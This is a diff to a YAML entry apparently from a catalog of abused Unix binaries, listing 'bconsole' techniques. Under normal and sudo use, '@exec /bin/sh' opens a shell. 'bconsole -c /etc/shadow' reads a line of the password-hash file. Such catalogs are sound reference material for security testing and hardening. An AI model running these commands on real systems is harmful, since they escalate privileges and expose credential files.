@@ -1,16 +1,14 @@
 ---
 functions:
   shell:
-    - description: The @exec function allows you to execute commands in the local tty
-      code: |
+    - code: |
         bconsole
         @exec /bin/sh
   sudo:
-    - description: The @exec function allows you to execute commands in the local tty
-      code: |
+    - code: |
         sudo bconsole
         @exec /bin/sh
   file-read:
-    - description: The error message of the -c options displays the first line of a restricted file, when having sudo rights for the binary.
-      code: sudo bconsole -c /etc/shadow
+    - description: The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files.
+      code: bconsole -c /etc/shadow
 ---
